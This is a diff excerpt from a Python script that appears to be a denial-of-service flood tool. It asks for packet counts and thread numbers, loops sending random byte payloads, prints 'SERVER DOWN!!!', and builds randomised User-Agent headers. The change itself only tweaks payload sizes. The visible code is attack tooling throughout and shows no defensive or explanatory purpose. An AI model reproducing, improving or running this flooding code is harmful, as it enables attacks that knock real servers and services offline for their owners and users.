@@ -52,7 +52,7 @@ times = int(input("[ ====> ] PACKETS : "))
 threads = int(input("[ ====> ] ISI PACKETS : "))
 os.system("clear")
 def run():
-	data = random._urandom(1026)
+	data = random._urandom(1203)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -66,7 +66,7 @@ def run():
 			print("[!] SERVER DOWN!!!")
 
 def run2():
-	data = random._urandom(1026)
+	data = random._urandom(1203)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
@@ -82,7 +82,7 @@ def run2():
 			
 def run3():
     global useragents, ref, acceptall
-    hh = random._urandom(1026)
+    hh = random._urandom(1025)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
